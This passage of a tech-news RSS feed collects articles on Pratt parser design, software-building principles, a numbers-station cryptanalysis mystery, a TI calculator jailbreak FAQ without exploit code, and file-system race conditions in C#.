<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you‚Äôd like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<h3 id="operator-database">Operator Database</h3>

<p>As a toy example, we might have an operator database as follows.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>Operator</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td><code>"123"</code></td>
      <td><code>"Number"</code></td>
      <td>0</td>
      <td>None</td>
      <td>Null</td>
      <td>Nullary</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code>"^"</code></td>
      <td><code>"Power"</code></td>
      <td>10</td>
      <td>Right</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>3</td>
      <td><code>"*"</code></td>
      <td><code>"Times"</code></td>
      <td>20</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code>"/"</code></td>
      <td><code>"Divide"</code></td>
      <td>20</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code>"+"</code></td>
      <td><code>"Plus"</code></td>
      <td>30</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code>"-"</code></td>
      <td><code>"Minus"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>LToken</th>
      <th>NToken</th>
      <th>OToken</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10</td>
      <td><code>"("</code></td>
      <td>&nbsp;</td>
      <td><code>")"</code></td>
      <td><code>"Parentheses"</code></td>
      <td>10</td>
      <td>Non</td>
      <td>Matchfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
      <td>‚ãÆ</td>
    </tr>
    <tr>
      <td>43</td>
      <td><code>"["</code></td>
      <td>&nbsp;</td>
      <td><code>"]"</code></td>
      <td><code>"Index"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>44</td>
      <td>&nbsp;</td>
      <td><code>"!"</code></td>
      <td>&nbsp;</td>
      <td><code>"Factorial"</code></td>
      <td>40</td>
      <td>Left</td>
      <td>Postfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>46</td>
      <td>&nbsp;</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td><code>"UnaryMinus"</code></td>
      <td>50</td>
      <td>Right</td>
      <td>Prefix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>49</td>
      <td><code>"/"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Divide"</code></td>
      <td>60</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>55</td>
      <td><code>"?"</code></td>
      <td>&nbsp;</td>
      <td><code>":"</code></td>
      <td><code>"IfThenElse"</code></td>
      <td>70</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Ternary</td>
    </tr>
    <tr>
      <td>57</td>
      <td><code>"+"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Plus"</code></td>
      <td>80</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>60</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Minus"</code></td>
      <td>90</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup‚Äînot at compile time‚Äîthe Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<h3 id="dynamic-dispatch">Dynamic Dispatch</h3>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the ‚Ä¶</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.robertjacobson.dev/designing-a-pratt-parser-generator">https://www.robertjacobson.dev/designing-a-pratt-parser-generator</a></em></p>]]>
            </description>
            <link>https://www.robertjacobson.dev/designing-a-pratt-parser-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513092</guid>
            <pubDate>Fri, 18 Sep 2020 04:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Principles for Building Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512801">thread link</a>) | @dailymorn
<br/>
September 17, 2020 | http://kevinmahoney.co.uk/articles/my-principles-for-building-software/ | <a href="https://web.archive.org/web/*/http://kevinmahoney.co.uk/articles/my-principles-for-building-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting" id="my-principles-for-building-software">
  <div itemprop="articleBody">
    <p><time itemprop="datePublished">17 September 2020</time></p>

<p>These are my personal principles for building software. I hope to frequently update them as my views change. There can be
valid reasons for breaking them (they are <em>principles</em>, not <em>laws</em>), but in general I believe following
them works out well.</p>

<p>Most of them revolve around making the system simpler in some way. It‚Äôs
my belief that simpler systems are more reliable, easier and quicker to modify,
and generally easier to work with.</p>

<ul>
  <li><a href="#make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</a></li>
  <li><a href="#data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</a></li>
  <li><a href="#design-data-first">Design ‚ÄúData First‚Äù</a></li>
  <li><a href="#measure-before-you-cut">Measure Before You Cut</a></li>
  <li><a href="#avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</a></li>
  <li><a href="#recognise-intrinsic-complexity">Recognise Intrinsic Complexity</a></li>
  <li><a href="#fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</a></li>
  <li><a href="#focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</a></li>
  <li><a href="#code-consistency-is-important">Code Consistency is Important</a></li>
  <li><a href="#shared-principles-are-important">Shared Principles are Important</a></li>
</ul>

<h2 id="make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</h2>

<p>I have put this first because I think it is one of the most important
and most powerful principles.</p>

<p>You may have heard this phrase in relation to designing your program‚Äôs types, but
the principle applies everywhere you represent data - for example database design.</p>

<p>Not only does this reduce the number of states
your system can be in (and thus make it simpler), but it reduces the
number of <em>invalid</em> states, which is even better! Your system does not
have to handle these states because they literally cannot be
represented in your program.</p>

<p>This is not just a minor convenience, it can drastically simplify your system and prevent
entire classes of bugs from occurring.</p>

<h2 id="data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</h2>

<p>Consistency enforces rules on your data, and so reduces the number
of states your system needs to handle. This follows on from the
‚Äúmake invalid states unrepresentable‚Äù principle.</p>

<p>I am using consistency here in a very general sense: that your data
adheres to certain rules, and that it always obeys those rules
at every point in time. This definition is related to ACID consistency, and shouldn‚Äôt be confused with CAP consistency.</p>

<p>The rules can be any pretty much anything, for example, 
that your credit should never be able to go negative,
or that private posts should not be visible to others.
It is not restricted to foreign keys or unique indexes, although
they are also valid examples.</p>

<p>As well as your database, consistency may be enforced by your
application utilising ACID transactions. It is preferable to enforce
them at the database level, but this is not common practice for
anything more complex than simple checks for practical reasons.</p>

<p>Anything which restricts or compromises consistency results in complexity.
This leads to the following practical advice:</p>

<p>It is simpler to have:</p>
<ul>
  <li>Fewer databases (ideally one)</li>
  <li>Normalised, less redundant data</li>
  <li>A ‚Äògood‚Äô database design (big topic)</li>
  <li>ACID transactions</li>
  <li>More data constraints</li>
</ul>

<p>It is more complex to have:</p>
<ul>
  <li>Multiple databases</li>
  <li>Redundant or denormalised data</li>
  <li>A poor database design</li>
  <li>Fewer (or no) data constraints</li>
</ul>

<p>Of course, there are valid reasons to make your system more complex, and I don‚Äôt
intend complexity to be a dirty word, but see <a href="#measure-before-you-cut">‚Äúmeasure before you cut‚Äù</a>.</p>

<p>I consider this principle to be one of the most undervalued in
software engineering today. Consistency issues often go unrecognised.
Many problems, I daresay <em>most</em> problems,
are consistency issues at an essential level - data that does
not conform to some expectation.</p>

<p>See <a href="#appendix-a-inconsistency-results-in-complexity">the appendix</a> for an illustration of how inconsistency can cause complexity.</p>

<h2 id="design-data-first">Design ‚ÄúData First‚Äù</h2>

<p>What is more likely to be around in 10 years: your code or your data?</p>

<p>Code can be thrown away and re-written, but this is rarely the case
with data.</p>

<p>Data is more important than code. The only purpose of code is to transform data.</p>

<p>When designing a new system, it‚Äôs best to start with your database and
your data structures and build your code on top of that. Consider
the constraints you can place on your data and enforce them, ideally
by the way your represent your data.</p>

<p>Code design flows naturally from data design. The simpler and more
consistent your data model is, the simpler your code will be.</p>

<blockquote>
<p>Show me your flowcharts and conceal your tables,
and I shall continue to be mystified. Show me your tables,
and I won‚Äôt usually need your flowcharts; they‚Äôll be obvious</p>

</blockquote>

<blockquote>
<p>Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</p>

</blockquote>

<h2 id="measure-before-you-cut">Measure Before You Cut</h2>

<p>This is the most common mistake made by software developers.
It‚Äôs responsible for <em>many</em> self-inflicted problems.</p>

<p>The principle is that when you make a trade-off that has a complexity cost, ensure that
the need for the trade-off is backed by emprical evidence.</p>

<p>Common mistakes:</p>

<ul>
  <li>Trying to build a complex ‚Äúscalable‚Äù system that scales to
a size you‚Äôll never need.</li>
  <li>Making services as small as possible without considering
need or cost.</li>
  <li>Adding inconsistency or complexity for performance in a part
of the system that is not a performance bottleneck.</li>
</ul>

<p>Advice:</p>

<ul>
  <li>Start with the simplest, most correct system possible.</li>
  <li>Measure performance.</li>
  <li>Do not pay complexity costs or violate the other principles
until it solves an actual problem, not an imaginary one.</li>
  <li>Some optimisations can be made without measurement, because
they have very little or zero cost. For example, using the
correct data structures that support favourable performance
for the operations you want to perform.</li>
  <li>It‚Äôs true that sometimes experience alone can tell you if you‚Äôre making the
correct trade-off. It‚Äôs still better if you can prove it.</li>
  <li>When you have to choose, prefer correctness and simplicity over performance.</li>
  <li>In some cases correct and simple code is the best performing code!</li>
</ul>

<blockquote>
<p>The real problem is that programmers have spent far too much time
worrying about efficiency in the wrong places and at the wrong times;
premature optimization is the root of all evil (or at least most of
it) in programming.</p>

</blockquote>

<h2 id="avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</h2>

<p>i.e. avoid making a part of the system simpler in exchange for making
the system as a whole more complex.</p>

<p>This trade is usually not an even one. Chasing after local simplicity can
cause and order of magnitude increase in global complexity.</p>

<p>For example, smaller services can make those services simpler,
but the reduction in consistency and the need for more inter-process
communication makes the system much more complicated.</p>

<h2 id="recognise-intrinsic-complexity">Recognise Intrinsic Complexity</h2>

<p>Sometimes things are just complicated. You cannot make problems simpler than they are.</p>

<p>Any attempt to do so will ironically make your system more complex.</p>

<h2 id="fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</h2>

<p>It is better to understand a few technologies deeply than many
technologies at a surface level. Fewer technologies mean fewer
things to learn, and less operational complexity.</p>

<h2 id="focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</h2>

<p>Do not concern yourself too much with intricate details of the software you use - you
can always look them up. Learn the underlying fundamental concepts.</p>

<p>Technologies change, concepts are eternal. The concepts you learn will
be used in newer technologies, and you will be able to learn them much quicker.</p>

<p>For example, do not concern yourself so much with the surface level
details of React, Kubernetes, Haskell, Rust, etc.</p>

<p>Focus on learning:</p>
<ul>
  <li>Pure functional programming</li>
  <li>The relational model</li>
  <li>Formal methods</li>
  <li>Logic programming</li>
  <li>Algebraic data types</li>
  <li>Typeclasses (in general and specific ones)</li>
  <li>The borrow checker (affine/linear types)</li>
  <li>Dependant Types</li>
  <li>The Curry-Howard Isomorphism</li>
  <li>Macros</li>
  <li>Homoiconicity</li>
  <li>VirtualDOM</li>
  <li>Linear regression</li>
  <li>etc.</li>
</ul>

<h2 id="code-consistency-is-important">Code Consistency is Important</h2>

<p>This is important for keeping the barrier to entry for understanding your code low.</p>

<p>Sometimes writing the consistent thing is more important than writing
the ‚Äúcorrect‚Äù thing. If you want to change the way something works in
your codebase, change all instances of it.  Otherwise, try to stick
with it.</p>



<p>The more principles you have in common with your teammates, the better
you will work together, and the more you will enjoy working together.</p>

<h2 id="appendix-a-inconsistency-results-in-complexity">Appendix A: Inconsistency Results in Complexity</h2>

<p>This is the simplest example I can think of to illustrate this principle.
I hope it doesn‚Äôt require too much imagination to relate to realistic
problems.</p>

<p>Consider a database with two Boolean variables <code>x</code> and <code>y</code>. Your
application has a rule that <code>x = y</code>, and it can enforce this rule by
using a transaction to atomically change both variables.</p>

<p>If this rule is correctly enforced, your data can only be
in two states: <code>(x = True, y = True)</code> or <code>(x = False, y = False)</code>.</p>

<p>Writing the function ‚Äòtoggle‚Äô with this rule in place is
straightforward. You atomically read one of the values and set both
values to the negation.</p>

<p>Now consider what happens if you split those variables into their own
databases and they can no longer be atomically changed together.</p>

<p>Because you can no longer consistently ensure that <code>x = y</code>, your data
can be in two more states: <code>(x = True, y = False)</code> or <code>(x = False, y = True)</code>.</p>

<ul>
  <li>Which value should you use if your system is in one of these states?</li>
  <li>What should your ‚Äòtoggle‚Äô function do in one of these states?</li>
  <li>How do you ensure that both writes are successful when writing a new value?</li>
</ul>

<p>There are no correct answers to these questions.</p>

<p>Of course, if we‚Äôd followed the <a href="#make-invalid-states-unrepresentable">‚Äúmake invalid states unrepresentable‚Äù</a> principle
in the first place, there would only be one variable! :)</p>

  </div>
</article></div>]]>
            </description>
            <link>http://kevinmahoney.co.uk/articles/my-principles-for-building-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512801</guid>
            <pubDate>Fri, 18 Sep 2020 03:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512546">thread link</a>) | @wglb
<br/>
September 17, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512546</guid>
            <pubDate>Fri, 18 Sep 2020 03:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ArTIfiCE is a jailbreak for TI CE calculators]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512502">thread link</a>) | @bane
<br/>
September 17, 2020 | https://yvantt.github.io/arTIfiCE/ | <a href="https://web.archive.org/web/*/https://yvantt.github.io/arTIfiCE/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="faqDiv">
                                    <p>Great question! A more detailed answer will make its way onto this page later on, but in summary: it gives back to users their legitimate right to enjoy a feature they paid for that TI unilaterally removed in the latest OS versions (allegedly for security reasons, but the bug that cheaters could in theory use was from TI and had nothing to do with ASM!)</p>

                                    <p>Delete the arTIfiCE appvar from the Memory menu (<tt>2nd</tt>+<tt>+</tt>). Depending on what you need to do, you may also want to delete any installed shell and trigger a RAM Reset as well (be sure to archive and/or backup your files first)</p>

                                    <p>Most probably not, considering arTIfiCE only executes a small piece of assembly code (which was previously possible in earlier OSes), and doesn't install anything persistent. Simply fully reset your calc and there will be no trace of it.</p>

                                    <p>arTIfiCE uses software bugs in the calculator's code to be able to execute assembly. A light "shell" is run allowing you to choose which program to launch. The source code may become available later on GitHub.</p>

                                    <p>Most likely, but many other bugs have been found that future versions of arTIfiCE may use :)</p>

                                    <p>No - arTIfiCE only restores functionality TI calculators had for dozens of years and removed in the latest OS. arTIfiCE is in no way a cheating tool, and cheating is not condoned here in any way.</p>

                                    <p>No - arTIfiCE resides in an "appvar" file (Application Variable, an 8xv file) and it will be deleted by the OS when going into Press-To-Test mode, just like most other appvars. You'll have to re-transfer+open it after your exam.</p>

                                    <p>No, or at least not directly: arTIfiCE only makes it possible for you to launch ASM programs, that's it. So you'd have to find a downgrade program for that (search for it on the usual websites).</p>

                                    <p>Sure, from the arTIfiCE shell, you can install another shell, for instance <a href="https://github.com/mateoconlechuga/cesium/releases/latest" target="_blank">Cesium</a>, which can be opened more quickly (thus you get to launch your programs more easily).</p>

                                    <p>Alright... The underlying exploit has a codename. In fact, all the underlying exploits found so far have fun codenames. They'll be released in due time :D</p>
                                </div></div>]]>
            </description>
            <link>https://yvantt.github.io/arTIfiCE/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512502</guid>
            <pubDate>Fri, 18 Sep 2020 02:55:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The File System is Unpredictable (2009)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512405">thread link</a>) | @azhenley
<br/>
September 17, 2020 | https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html | <a href="https://web.archive.org/web/*/https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the more frequent questions I answer on StackOverflow is a variation of the following.</p>

<blockquote>
  <p>I‚Äôm doing XXX with a file, how can I know if the file exists?</p>
</blockquote>

<p>The variations include verify no one else has the file open, if the file is in use, the file is not writable, etc ‚Äò. The answer to all of these questions is unfortunately the same. Simply put you can‚Äôt. The reason why is the fundamental nature of the file system prevents such predictive operations.</p>

<p>The file system is a resource with multiple levels of control that is shared between all users and processes in the system. The levels of control include but are not limited to file system and sharing permissions. At <strong>any</strong> point in time any entity on the computer may change a file system object or it‚Äôs controls in any number of ways. For example</p>

<ul>
  <li>The file could be deleted</li>
  <li>A file could be created at place one previously did not exist</li>
  <li>Permissions could change on the file in such a way that the current process does not have access</li>
  <li>Another process could open the file in such a way that is not conducive to sharing</li>
  <li>The user remove the USB key containing the file</li>
  <li>The network connection to the mapped drive could get disconnected</li>
</ul>

<p>Or in short</p>

<blockquote>
  <p>The file system is best viewed as a multi-threaded object over which you have no reliable synchronization capabilities</p>
</blockquote>

<p>Many developers, and APIs for that matter, though treat the file system as though it‚Äôs a static resource and assume what‚Äôs true at one point in time will be true later. Essentially using the result of one operation to predict the success or failure of another. This ignores the possibility of the above actions interweaving in between calls. It leads to code which reads well but executes badly in scenarios where more than one entity is changing the file system.</p>

<p>These problems are best demonstrated by a quick sample. Lets keep it simple and take a stab at a question I‚Äôve seen a few times. The challenge is to write a function which returns all of the text from a file if it exists and an empty string if it does not. To simplify this problem lets assume permissions are not an issue, paths are properly formatted, paths point to local drives and people aren‚Äôt randomly ripping out USB keys. Using the System.IO.File APIs we may construct the following solution.</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>File</span><span>.</span><span>Exists</span><span>(</span><span>path</span><span>))</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span> <span>// Bug!!!</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This code reads great and at a glance looks correct but is actually fundamentally flawed. The reason why is the code changes depends on the call to File.Exist to be true for a large portion of the function. It‚Äôs being used to predict the success of the call to ReadAllText. However there is nothing stopping the file from being deleted in between these two calls. In that case the call to File.ReadAllText would throw a FileNotFoundException which is exactly what the API is trying to prevent!</p>

<p>This code is flawed because it‚Äôs attempting to use one piece of data to make a prediction about the future state of the file system. This is simply not possible with the way the file system is designed. It‚Äôs a shared resource with no reliable synchronization mechanism. File.Exists is much better named as File.ExistedInTheRecentPast (the name gets much worse if you consider the impact of permissions).</p>

<p>Knowing this, how could we write ReadTextOrEmpty in a reliable fashion‚Äô Even though you can not make predictions on the file system the failures of operations is a finite set. So instead of attempting to predict successful conditions for the method, why not just execute the operation and deal with the consequences of failure?</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span>
    <span>}</span> <span>catch</span> <span>(</span><span>DirectoryNotFoundException</span><span>)</span> <span>{</span>
